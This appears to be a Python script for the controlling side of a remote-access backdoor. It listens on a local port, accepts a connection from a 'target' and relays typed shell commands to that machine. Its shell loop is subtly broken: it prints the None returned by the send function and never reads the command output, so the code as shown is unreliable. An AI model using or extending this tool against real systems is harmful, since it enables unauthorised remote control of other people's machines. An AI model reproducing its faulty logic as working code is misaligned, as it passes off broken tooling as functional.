import socket
import json
import sys
import time

HOST = "127.0.0.1" # Address to listen on
PORT = 6969 # Port to listen on. (Better to use unprivileged ports)

def send_command(conn, *args):
    """Send a command to the target"""
    conn.send(json.dumps(args).encode())

def wait_response(conn):
    """Gets a response from the target"""
    raw = conn.recv(1024).decode()
    print(raw)
    data = json.loads(raw)
    return data

def shell(conn): 
    """Actions performed when the shell command is typed"""
    print("[INFO] Dropping into a shell...")
    time.sleep(0.5)
    while True:
        send_command(conn, "command", "cd")
        cd = wait_response(conn)
        command = input(cd + " >")
        if command == "exit": break

        output = send_command(conn, "command", command)
        print(output)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    print(f"[INFO] Listening on {HOST}:{PORT}")
    sock.listen(1) # Wait for an incoming connection
    conn, addr = sock.accept() # Accept the connection. Store the connection and the IP address of the client connecting
    with conn: 
        print(f"[INFO] Connection received from {addr}\n")
        while True:
            command = input("CMD> ") # Request user command input
            match command: # Parse user command input
                case 'shell':
                    shell(conn)
            data = conn.recv(1024)
            print(data)
